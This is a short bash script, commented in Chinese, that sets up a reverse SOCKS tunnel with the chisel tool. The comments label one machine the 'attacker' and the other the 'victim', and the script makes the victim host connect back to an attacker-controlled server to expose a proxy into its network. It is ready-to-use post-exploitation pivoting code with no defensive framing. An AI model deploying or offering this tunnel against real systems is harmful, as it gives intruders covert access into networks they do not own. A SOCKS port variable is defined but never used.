#!/usr/bin/env bash
# chisel 反向：攻击机 listen，受害机 connect 回传 SOCKS
# 攻击机: CHISEL=./chisel PORT=8080 bash -c '$CHISEL server -p $PORT --reverse'
# 受害机: 填 SERVER / 本脚本
set -euo pipefail
: "${CHISEL:=chisel}"
: "${SERVER:?}"          # 例: https://攻击机:8080
: "${SOCKS:=1080}"
echo "[*] $CHISEL client $SERVER R:socks"
exec "$CHISEL" client "$SERVER" "R:socks"
